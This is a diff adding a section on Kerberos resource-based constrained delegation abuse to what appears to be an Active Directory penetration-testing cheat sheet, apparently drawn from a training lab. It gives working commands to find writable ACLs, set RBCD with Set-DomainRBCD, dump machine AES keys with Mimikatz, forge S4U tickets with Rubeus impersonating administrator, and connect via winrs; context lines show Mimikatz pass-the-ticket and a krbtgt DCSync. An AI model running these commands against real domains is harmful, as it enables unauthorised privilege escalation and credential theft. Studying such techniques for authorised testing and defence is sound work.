@@ -399,6 +399,55 @@ Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
 Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 ```
 
+## 🧷Kerberos Resource-based Constrained Delegation
+
+### Description
+
+* This moves delegation authority to the resource/service administrator.
+* Instead of SPNs on msDs AllowedToDelegatTo on the front end service like web service, access in this case is controlled by security descriptor of msDS AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
+* That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.
+
+### Requirement
+
+We need two privileges
+
+1. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
+2. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
+
+### Tool
+
+Find Write ACL on machines (do that with every user you own)
+
+```powershell
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+
+
+cd ADModule-master
+Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
+Import-Module .\ActiveDirectory\ActiveDirectory.psd1
+
+
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'your-username' -Verbose
+```
+
+**Get your own Machine Account AES-Hash**
+
+```powershell
+Invoke-mimikatz -command '"sekurlsa::ekeys"'
+```
+
+Access the machine with our AES key with ANY user we wanode
+
+{% code overflow="wrap" %}
+```powershell
+rubeus.exe s4u /user:hostname$ /aes256:aes-hash-of-hostname /msdsspn:http/target-host /impersonateuser:administrator /ptt
+
+Winrs -r:target-host
+```
+{% endcode %}
+
+
+
 ## 🤖DNSAdmins Privilege Escalation
 
 ### Description
